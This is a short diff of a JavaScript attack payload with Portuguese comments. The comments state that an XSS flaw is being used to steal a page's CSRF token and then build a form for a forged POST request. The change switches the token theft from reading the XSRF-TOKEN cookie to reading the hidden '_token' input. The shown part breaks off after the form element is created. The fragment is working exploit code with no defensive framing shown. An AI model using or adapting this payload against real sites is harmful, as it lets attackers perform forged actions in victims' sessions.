@@ -3,7 +3,7 @@
 // Mas podemos usar a vulnerabilidade de XSS para roubar o token CSRF da página.
 
 // 1. Rouba o token CSRF da página
-var xsrfToken = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
+var xsrfToken = document.querySelector('input[name="_token"]').value;
 
 // 2. Cria um formulário para fazer a requisição POST
 var form = document.createElement('form');
